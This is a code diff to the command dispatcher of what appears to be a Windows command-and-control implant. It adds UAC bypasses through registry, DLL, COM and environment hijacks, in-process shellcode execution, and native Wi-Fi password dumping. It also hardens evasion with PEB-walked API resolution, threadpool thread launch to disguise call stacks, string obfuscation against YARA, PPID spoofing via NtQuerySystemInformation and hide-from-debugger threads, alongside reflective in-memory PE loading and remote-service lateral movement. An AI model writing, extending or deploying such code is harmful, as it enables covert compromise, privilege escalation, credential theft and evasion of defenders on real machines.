@@ -51,6 +51,7 @@
  *
  *  C-implemented (formerly stubs, now live):
  *    inject_shellcode / dll_inject / uac_bypass / getsystem / token_revert
+ *    uac_reg_hijack / uac_dll_hijack / uac_com_hijack / uac_env_expand
  *    clip_watch / open_url / set_wallpaper / mouse_move / type_keys / run_psh
  *
  *  Shell fallback:
@@ -62,6 +63,9 @@
 #include "../core/ntcalls.h"
 #include "../inject/inject.h"
 #include "../evasion/evasion.h"
+#include "../evasion/peb_walk.h"
+#include "../evasion/k32_walk.h"
+#include "../evasion/obf.h"
 #include "../inject/loader.h"
 #include "../inject/loader_blob.h"
 #include "../evasion/syscall.h"
@@ -106,12 +110,12 @@ typedef enum { JOB_FREE=0, JOB_RUNNING, JOB_DONE } _JobState;
 typedef struct {
     volatile _JobState state;
     int                id;
-    HANDLE             hThread;    /* background worker thread                 */
+    HANDLE             hThread;    /* worker thread handle — kept open until job freed */
     HANDLE             hProcess;   /* cmd.exe process handle (for job_kill)    */
     char              *output;     /* heap-allocated accumulated stdout        */
     size_t             outLen;
     char               cmd[1024];  /* copy of the command string               */
-    TLS_CONTEXT       *pTls;       /* shared TLS channel                       */
+    TLS_CONTEXT       *volatile pTls; /* shared TLS channel — may be nulled on disconnect */
 } _Job;
 
 static _Job            g_jobs[JOB_MAX];
@@ -219,10 +223,17 @@ static DWORD WINAPI _job_worker(LPVOID param)
     job->state    = JOB_DONE;
     LeaveCriticalSection(&g_job_cs);
 
-    /* Notify C2 that the job finished */
-    char note[64];
-    _snprintf(note, sizeof(note) - 1, "[*] job %d done (%zu bytes)", job->id, used);
-    _safe_send(job->pTls, note);
+    /* Notify C2 that the job finished — only if the session is still live.
+     * job->pTls is set to NULL by shell_run on disconnect; guard against
+     * the stale-pointer case by reading under the TLS critical section.   */
+    EnterCriticalSection(&g_tls_cs);
+    TLS_CONTEXT *pNotifyTls = job->pTls;
+    if (pNotifyTls) {
+        char note[64];
+        _snprintf(note, sizeof(note) - 1, "[*] job %d done (%zu bytes)", job->id, used);
+        tls_send_msg(pNotifyTls, (const BYTE *)note, (DWORD)strlen(note));
+    }
+    LeaveCriticalSection(&g_tls_cs);
 
     return 0;
 }
@@ -263,17 +274,28 @@ static void _bg_shell_exec(TLS_CONTEXT *pTls, const char *cmd)
 
     LeaveCriticalSection(&g_job_cs);
 
-    /* Spawn worker */
-    slot->hThread = CreateThread(NULL, 0, _job_worker, slot, 0, NULL);
-    if (!slot->hThread) {
-        EnterCriticalSection(&g_job_cs);
-        slot->state = JOB_FREE;
-        LeaveCriticalSection(&g_job_cs);
-        _send_str(pTls, "[-] bg: CreateThread failed");
-        return;
+    /*
+     * Spawn worker via threadpool first (ntdll!TppWorkerThread call-stack).
+     * Threadpool path yields no joinable HANDLE — job_kill/job_output just
+     * won't be able to wait on the worker thread, which is acceptable.
+     * Fallback: PEB-resolved CreateThread (no direct IAT entry).
+     */
+    if (sc_threadpool_exec((LPTHREAD_START_ROUTINE)_job_worker, slot)) {
+        /* Threadpool submitted — mark slot so job_kill skips the WaitForSingleObject */
+        slot->hThread = INVALID_HANDLE_VALUE;
+    } else {
+        slot->hThread = k32_CreateThread(NULL, 0, _job_worker, slot, 0, NULL);
+        if (!slot->hThread) {
+            EnterCriticalSection(&g_job_cs);
+            slot->state = JOB_FREE;
+            LeaveCriticalSection(&g_job_cs);
+            _send_str(pTls, "[-] bg: thread start failed");
+            return;
+        }
     }
-    CloseHandle(slot->hThread);
-    slot->hThread = NULL;
+    /* hThread is INVALID_HANDLE_VALUE (threadpool path) or a real handle.
+     * _job_kill / _job_output guard against INVALID_HANDLE_VALUE before
+     * calling WaitForSingleObject / CloseHandle.                          */
 
     char buf[64];
     _snprintf(buf, sizeof(buf) - 1, "[+] bg: job %d started", slot->id);
@@ -344,13 +366,19 @@ static void _job_output(TLS_CONTEXT *pTls, const char *args)
         _send_str(pTls, buf); return;
     }
 
-    /* Steal the output buffer and free the slot */
+    /* Steal the output buffer and free the slot.
+     * The worker is DONE, so hThread has already exited — close it now.   */
     char  *out   = job->output;
     size_t outLen= job->outLen;
+    HANDLE hTh   = job->hThread;
     job->output  = NULL;
     job->outLen  = 0;
+    job->hThread = NULL;
     job->state   = JOB_FREE;
     LeaveCriticalSection(&g_job_cs);
+
+    /* Guard: INVALID_HANDLE_VALUE = threadpool path, nothing to close */
+    if (hTh && hTh != INVALID_HANDLE_VALUE) CloseHandle(hTh);
 
     if (out && outLen > 0)
         tls_send_msg(pTls, (const BYTE *)out, (DWORD)outLen);
@@ -379,15 +407,28 @@ static void _job_kill(TLS_CONTEXT *pTls, const char *args)
     }
 
     HANDLE hProc = job->hProcess;
+    HANDLE hTh   = job->hThread;
     job->hProcess = NULL;
+    job->hThread  = NULL;
     if (job->output) { free(job->output); job->output = NULL; }
+    /* Mark FREE *before* releasing the lock so the slot cannot be reused
+     * until the worker has actually stopped writing into it.  We wait for
+     * the thread to exit below (outside the lock) before returning.       */
     job->state = JOB_FREE;
     LeaveCriticalSection(&g_job_cs);
 
     if (hProc) {
-        TerminateProcess(hProc, 1);
+        /* Terminating the process unblocks the worker's ReadFile loop,
+         * causing it to exit naturally.  Use PEB-resolved TerminateProcess. */
+        k32_TerminateProcess(hProc, 1);
         CloseHandle(hProc);
     }
+    /* Guard: INVALID_HANDLE_VALUE = threadpool path — no WaitForSingleObject */
+    if (hTh && hTh != INVALID_HANDLE_VALUE) {
+        WaitForSingleObject(hTh, 5000);
+        CloseHandle(hTh);
+    }
+
     char buf[48]; _snprintf(buf, sizeof(buf)-1, "[+] job %d killed", id);
     _send_str(pTls, buf);
 }
@@ -723,14 +764,11 @@ void shell_run(TLS_CONTEXT *pTls)
             continue;
         }
 
-        /* wifi_passwords â†’ netsh wlan */
+        /* wifi_passwords — native WlanGetProfile (no cmd.exe for-loop) */
         if (cbCmd >= 14 && strncmp("wifi_passwords", cmd, 14) == 0 &&
             (cbCmd == 14 || cmd[14] == ' ')) {
             free(pCmd); pCmd = NULL;
-            _shell_exec(pTls,
-                "for /f \"tokens=2 delims=:\" %a in "
-                "('netsh wlan show profiles ^| findstr Profile') do "
-                "netsh wlan show profile name=%a key=clear 2>&1");
+            _handle_wifi_passwords(pTls);
             continue;
         }
 
@@ -751,27 +789,27 @@ void shell_run(TLS_CONTEXT *pTls)
             continue;
         }
 
-        /* netstat â†’ netstat -ano */
+        /* netstat — native GetExtendedTcpTable (no cmd.exe) */
         if (cbCmd >= 7 && strncmp("netstat", cmd, 7) == 0 &&
             (cbCmd == 7 || cmd[7] == ' ')) {
             free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, "netstat -ano 2>&1");
+            _handle_netstat(pTls);
             continue;
         }
 
-        /* arp â†’ arp -a */
+        /* arp — native GetIpNetTable2 (no cmd.exe) */
         if (cbCmd >= 3 && strncmp("arp", cmd, 3) == 0 &&
             (cbCmd == 3 || cmd[3] == ' ')) {
             free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, "arp -a 2>&1");
+            _handle_arp(pTls);
             continue;
         }
 
-        /* ifconfig â†’ ipconfig /all */
+        /* ifconfig — native GetAdaptersAddresses (no cmd.exe) */
         if (cbCmd >= 8 && strncmp("ifconfig", cmd, 8) == 0 &&
             (cbCmd == 8 || cmd[8] == ' ')) {
             free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, "ipconfig /all 2>&1");
+            _handle_ifconfig(pTls);
             continue;
         }
 
@@ -779,7 +817,7 @@ void shell_run(TLS_CONTEXT *pTls)
         if (cbCmd >= 6 && strncmp("routes", cmd, 6) == 0 &&
             (cbCmd == 6 || cmd[6] == ' ')) {
             free(pCmd); pCmd = NULL;
-            _shell_exec(pTls, "route print 2>&1");
+            _handle_routes(pTls);
             continue;
         }
 
@@ -855,12 +893,60 @@ void shell_run(TLS_CONTEXT *pTls)
             continue;
         }
 
-        /* uac_bypass <command> — CMSTPLUA COM elevation */
-        if (cbCmd >= 11 && strncmp("uac_bypass ", cmd, 11) == 0) {
+        /* uac_bypass [exe] — elevate via schtasks /RL HIGHEST
+         * Bare "uac_bypass" (no args) = relaunch this agent at High IL.
+         * "uac_bypass <exe>" = launch <exe> at High IL. */
+        if ((cbCmd == 10 && strncmp("uac_bypass", cmd, 10) == 0) ||
+            (cbCmd >= 11 && strncmp("uac_bypass ", cmd, 11) == 0)) {
             char args[2048] = {0};
-            strncpy(args, cmd + 11, sizeof(args) - 1);
+            if (cbCmd > 11)
+                strncpy(args, cmd + 11, sizeof(args) - 1);
             free(pCmd); pCmd = NULL;
             _handle_uac_bypass(pTls, args);
+            continue;
+        }
+
+        /* uac_reg_hijack <payload> — HKCU registry hijack (fodhelper/eventvwr) */
+        if ((cbCmd == 14 && strncmp("uac_reg_hijack", cmd, 14) == 0) ||
+            (cbCmd >= 15 && strncmp("uac_reg_hijack ", cmd, 15) == 0)) {
+            char args[MAX_PATH * 2] = {0};
+            if (cbCmd > 15)
+                strncpy(args, cmd + 15, sizeof(args) - 1);
+            free(pCmd); pCmd = NULL;
+            _handle_uac_reg_hijack(pTls, args);
+            continue;
+        }
+
+        /* uac_dll_hijack <dllname> <target_exe> — DLL search-order hijack */
+        if ((cbCmd == 14 && strncmp("uac_dll_hijack", cmd, 14) == 0) ||
+            (cbCmd >= 15 && strncmp("uac_dll_hijack ", cmd, 15) == 0)) {
+            char args[MAX_PATH * 2] = {0};
+            if (cbCmd > 15)
+                strncpy(args, cmd + 15, sizeof(args) - 1);
+            free(pCmd); pCmd = NULL;
+            _handle_uac_dll_hijack(pTls, args);
+            continue;
+        }
+
+        /* uac_com_hijack <payload> — ICMLuaUtil COM elevation moniker */
+        if ((cbCmd == 14 && strncmp("uac_com_hijack", cmd, 14) == 0) ||
+            (cbCmd >= 15 && strncmp("uac_com_hijack ", cmd, 15) == 0)) {
+            char args[MAX_PATH * 2] = {0};
+            if (cbCmd > 15)
+                strncpy(args, cmd + 15, sizeof(args) - 1);
+            free(pCmd); pCmd = NULL;
+            _handle_uac_com_hijack(pTls, args);
+            continue;
+        }
+
+        /* uac_env_expand [payload] — %APPDATA% redirect + srrstr.dll sideload */
+        if ((cbCmd == 14 && strncmp("uac_env_expand", cmd, 14) == 0) ||
+            (cbCmd >= 15 && strncmp("uac_env_expand ", cmd, 15) == 0)) {
+            char args[MAX_PATH] = {0};
+            if (cbCmd > 15)
+                strncpy(args, cmd + 15, sizeof(args) - 1);
+            free(pCmd); pCmd = NULL;
+            _handle_uac_env_expand(pTls, args);
             continue;
         }
 
@@ -873,12 +959,31 @@ void shell_run(TLS_CONTEXT *pTls)
             continue;
         }
 
-        /* lateral_sc <host> <command> â€” remote service creation */
+        /* lateral_sc <host> <command> — remote service creation */
         if (cbCmd >= 11 && strncmp("lateral_sc ", cmd, 11) == 0) {
             char args[1024] = {0};
             strncpy(args, cmd + 11, sizeof(args) - 1);
             free(pCmd); pCmd = NULL;
             _handle_lateral_sc(pTls, args);
+            continue;
+        }
+
+        /* exec_bof <hex-shellcode> [s:<str>|i:<int>|z:<short>|w:<str>|b:<hex>]
+         * In-process shellcode execution with BOF-style argument packing.
+         * W^X: alloc RW → write → RX → NtCreateThreadEx(HideFromDebugger)
+         * Thread submitted via sc_threadpool_exec (TppWorkerThread call-stack). */
+        if (cbCmd >= 9 && strncmp("exec_bof ", cmd, 9) == 0) {
+            char *argsBuf = (char *)malloc(cbCmd);
+            if (argsBuf) {
+                strncpy(argsBuf, cmd + 9, cbCmd - 9);
+                argsBuf[cbCmd - 9] = '\0';
+                free(pCmd); pCmd = NULL;
+                _handle_exec_bof(pTls, argsBuf);
+                free(argsBuf);
+            } else {
+                free(pCmd); pCmd = NULL;
+                _send_str(pTls, "[-] exec_bof: OOM");
+            }
             continue;
         }
 
@@ -922,22 +1027,27 @@ void shell_run(TLS_CONTEXT *pTls)
                     dbg  ? "YES" : "no",
                     rdbg ? "YES" : "no");
 
-                /* VM / sandbox heuristic: check for common VM registry keys */
-                const char *vmKeys[] = {
-                    "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
-                    "SOFTWARE\\VMware, Inc.\\VMware Tools",
-                    "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
-                };
-                const char *vmVals[] = { "Identifier", "InstallPath", "InstallDir" };
+                /* VM / sandbox heuristic: check for common VM registry keys.
+                 * Key strings are decoded on-the-fly via SLIT_BUF — no plaintext
+                 * appears in .rdata for YARA / strings(1) to match. */
                 BOOL vm = FALSE;
-                for (int vi = 0; vi < 3 && !vm; vi++) {
-                    HKEY hk = NULL;
-                    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vmKeys[vi], 0, KEY_READ, &hk)
-                            == ERROR_SUCCESS) {
-                        vm = TRUE;
-                        RegCloseKey(hk);
+                {
+                    char _vmk0[80], _vmk1[32], _vmk2[40];
+                    SLIT_BUF(_vmk0, sizeof(_vmk0),
+                        "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0");
+                    SLIT_BUF(_vmk1, sizeof(_vmk1),
+                        "SOFTWARE\\VMware, Inc.\\VMware Tools");
+                    SLIT_BUF(_vmk2, sizeof(_vmk2),
+                        "SOFTWARE\\Oracle\\VirtualBox Guest Additions");
+                    const char *vmKeys[3] = { _vmk0, _vmk1, _vmk2 };
+                    for (int vi = 0; vi < 3 && !vm; vi++) {
+                        HKEY hk = NULL;
+                        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vmKeys[vi], 0, KEY_READ, &hk)
+                                == ERROR_SUCCESS) {
+                            vm = TRUE;
+                            RegCloseKey(hk);
+                        }
                     }
-                    (void)vmVals[vi];
                 }
                 off += _snprintf(buf + off, sizeof(buf) - off - 1,
                     "[VM]      artefacts=%s\n", vm ? "YES" : "no");
@@ -1229,8 +1339,8 @@ void shell_run(TLS_CONTEXT *pTls)
                 continue;
             }
 
-            /* Resolve kernel32 API pointers for the loader */
-            HMODULE hK32s = GetModuleHandleA("kernel32.dll");
+            /* Resolve kernel32 API pointers via PEB walk — no IAT entries (G-03) */
+            PVOID hK32sl = peb_get_module(peb_hash_str("kernel32.dll"));
             typedef LPVOID (WINAPI *pVA2_t)(LPVOID,SIZE_T,DWORD,DWORD);
             typedef BOOL   (WINAPI *pFIC2_t)(HANDLE,LPCVOID,SIZE_T);
             typedef HMODULE(WINAPI *pLL2_t)(LPCSTR);
@@ -1238,12 +1348,12 @@ void shell_run(TLS_CONTEXT *pTls)
             typedef HANDLE (WINAPI *pCT2_t)(LPSECURITY_ATTRIBUTES,SIZE_T,
                                              LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
             typedef BOOL   (WINAPI *pCH2_t)(HANDLE);
-            pVA2_t  pVA2  = (pVA2_t) GetProcAddress(hK32s,"VirtualAlloc");
-            pFIC2_t pFIC2 = (pFIC2_t)GetProcAddress(hK32s,"FlushInstructionCache");
-            pLL2_t  pLL2  = (pLL2_t) GetProcAddress(hK32s,"LoadLibraryA");
-            pGP2_t  pGP2  = (pGP2_t) GetProcAddress(hK32s,"GetProcAddress");
-            pCT2_t  pCT2  = (pCT2_t) GetProcAddress(hK32s,"CreateThread");
-            pCH2_t  pCH2  = (pCH2_t) GetProcAddress(hK32s,"CloseHandle");
+            pVA2_t  pVA2  = (pVA2_t) (void *)peb_get_export(hK32sl,peb_hash_str("VirtualAlloc"));
+            pFIC2_t pFIC2 = (pFIC2_t)(void *)peb_get_export(hK32sl,peb_hash_str("FlushInstructionCache"));
+            pLL2_t  pLL2  = (pLL2_t) (void *)peb_get_export(hK32sl,peb_hash_str("LoadLibraryA"));
+            pGP2_t  pGP2  = (pGP2_t) (void *)peb_get_export(hK32sl,peb_hash_str("GetProcAddress"));
+            pCT2_t  pCT2  = (pCT2_t) (void *)peb_get_export(hK32sl,peb_hash_str("CreateThread"));
+            pCH2_t  pCH2  = (pCH2_t) (void *)peb_get_export(hK32sl,peb_hash_str("CloseHandle"));
 
             if (!pVA2 || !pFIC2 || !pLL2 || !pGP2 || !pCT2 || !pCH2) {
                 free(pPE2);
@@ -1267,7 +1377,9 @@ void shell_run(TLS_CONTEXT *pTls)
             rfdS.pCreateThread         = pCT2;
             rfdS.pCloseHandle          = pCH2;
 
-            /* Allocate RW region in current process: [loader | RflData | PE] */
+            /* Allocate RW region in current process: [loader | RflData | PE]
+             * No trampoline needed — in-process launch uses sc_threadpool_exec
+             * which produces ntdll!TppWorkerThread at the top of the stack.  */
             SIZE_T cbLs  = (SIZE_T)S_RFL_LOADER_SIZE;
             SIZE_T cbRs  = sizeof(RflData);
             SIZE_T cbTs  = cbLs + cbRs + (SIZE_T)cbPE2;
@@ -1297,17 +1409,24 @@ void shell_run(TLS_CONTEXT *pTls)
             SC_NtProtectVirtualMemory(GetCurrentProcess(), &pBS, &cPS,
                                       PAGE_EXECUTE_READ, &oPS);
 
-            /* Launch loader in a new thread — it maps + starts AgentRun */
-            PVOID  pArgS  = (BYTE *)pRemS + cbLs;
-            HANDLE hThS   = NULL;
-            NTSTATUS nsT  = SC_NtCreateThreadEx(
-                &hThS, THREAD_ALL_ACCESS, NULL,
-                GetCurrentProcess(), pRemS, pArgS,
-                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
-                0, 0, 0, NULL);
+            /* Launch loader in-process.
+             * Primary: sc_threadpool_exec → ntdll!TppWorkerThread call-stack.
+             * Fallback: NtCreateThreadEx with HIDE_FROM_DEBUGGER flag.        */
+            PVOID  pArgS = (BYTE *)pRemS + cbLs;
+            BOOL   launched;
+            launched = sc_threadpool_exec((LPTHREAD_START_ROUTINE)pRemS, pArgS);
+            if (!launched) {
+                HANDLE hThS  = NULL;
+                NTSTATUS nsT = SC_NtCreateThreadEx(
+                    &hThS, THREAD_ALL_ACCESS, NULL,
+                    GetCurrentProcess(), pRemS, pArgS,
+                    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
+                    0, 0, 0, NULL);
+                launched = NT_SUCCESS(nsT) && hThS;
+                if (launched) SC_NtClose(hThS);
+            }
 
-            if (NT_SUCCESS(nsT) && hThS) {
-                SC_NtClose(hThS);
+            if (launched) {
                 _send_str(pTls, "[+] stage_load: PE loaded in-memory, AgentRun started");
             } else {
                 _send_str(pTls, "[-] stage_load: thread creation failed");
@@ -1441,6 +1560,18 @@ void shell_run(TLS_CONTEXT *pTls)
     }
 
     if (pCmd) free(pCmd);
+
+    /* Null out pTls in all live job slots so background workers that are
+     * still running (blocked on ReadFile) do not send notifications to a
+     * stale TLS_CONTEXT that may belong to the next session.             */
+    if (g_cs_init) {
+        EnterCriticalSection(&g_tls_cs);
+        for (int _i = 0; _i < JOB_MAX; _i++) {
+            if (g_jobs[_i].state != JOB_FREE)
+                g_jobs[_i].pTls = NULL;
+        }
+        LeaveCriticalSection(&g_tls_cs);
+    }
 }
 
 
@@ -1501,22 +1632,43 @@ void _shell_exec(TLS_CONTEXT *pTls, const char *cmd)
     }
     SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
 
-    /* ── PPID spoof: find explorer.exe ───────────────────────────────── */
+    /* ── PPID spoof: find explorer.exe via NtQuerySystemInformation ──── */
     HANDLE hExplorer = NULL;
     {
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (hSnap != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
-            if (Process32First(hSnap, &pe)) {
-                do {
-                    if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
-                        hExplorer = OpenProcess(PROCESS_CREATE_PROCESS,
-                                                FALSE, pe.th32ProcessID);
-                        if (hExplorer) break;
+        /* Use NtQSI instead of CreateToolhelp32Snapshot to avoid the
+         * high-signal kernel callback that all major EDRs hook.          */
+        ULONG _spi_sz = 0;
+        SC_NtQuerySystemInformation(5, NULL, 0, &_spi_sz);
+        if (_spi_sz == 0) _spi_sz = 512 * 1024;
+        _spi_sz += 65536;
+        BYTE *_spi = (BYTE *)malloc(_spi_sz);
+        if (_spi) {
+            ULONG _spi_ret = 0;
+            if (NT_SUCCESS(SC_NtQuerySystemInformation(5, _spi, _spi_sz, &_spi_ret))) {
+                static const WCHAR _expl[] = L"explorer.exe";
+                const BYTE *_q = _spi;
+                for (;;) {
+                    ULONG  _no; USHORT _nl; PVOID _nb; HANDLE _pid;
+                    memcpy(&_no, _q + 0x00, 4);
+                    memcpy(&_nl, _q + 0x38, 2);
+                    memcpy(&_nb, _q + 0x40, sizeof(PVOID));
+                    memcpy(&_pid, _q + 0x60, sizeof(HANDLE));
+                    if (_nl == sizeof(_expl) - sizeof(WCHAR) && _nb) {
+                        WCHAR _nm[16] = {0};
+                        SIZE_T _cp = _nl < sizeof(_nm)-2 ? _nl : sizeof(_nm)-2;
+                        memcpy(_nm, _nb, _cp);
+                        if (_wcsicmp(_nm, _expl) == 0) {
+                            hExplorer = k32_OpenProcess(PROCESS_CREATE_PROCESS,
+                                                        FALSE,
+                                                        (DWORD)(ULONG_PTR)_pid);
+                            if (hExplorer) break;
+                        }
                     }
-                } while (Process32Next(hSnap, &pe));
+                    if (_no == 0) break;
+                    _q += _no;
+                }
             }
-            CloseHandle(hSnap);
+            free(_spi);
         }
     }
 
@@ -1577,7 +1729,7 @@ void _shell_exec(TLS_CONTEXT *pTls, const char *cmd)
     size_t bufSize = SHELL_RESP_BUF;
     char  *resp    = (char *)calloc(1, bufSize);
     if (!resp) {
-        TerminateProcess(pi.hProcess, 1);
+        k32_TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hProcess);
         CloseHandle(hReadPipe);
         _send_str(pTls, "[-] out of memory");
@@ -1589,14 +1741,18 @@ void _shell_exec(TLS_CONTEXT *pTls, const char *cmd)
     DWORD  nRead = 0;
     while (ReadFile(hReadPipe, chunk, sizeof(chunk), &nRead, NULL) && nRead > 0) {
         if (used + nRead + 1 >= bufSize) {
-            size_t newSz = bufSize * 2;
+            /* Cap growth at JOB_BUF_LIMIT to prevent unbounded heap growth */
+            if (bufSize >= JOB_BUF_LIMIT) break;
+            size_t newSz = (bufSize * 2 < JOB_BUF_LIMIT) ? bufSize * 2 : JOB_BUF_LIMIT;
             char  *p     = (char *)realloc(resp, newSz);
             if (!p) break;
             resp    = p;
             bufSize = newSz;
         }
-        memcpy(resp + used, chunk, nRead);
-        used += nRead;
+        if (used + nRead < bufSize) {
+            memcpy(resp + used, chunk, nRead);
+            used += nRead;
+        }
     }
     resp[used] = '\0';
 
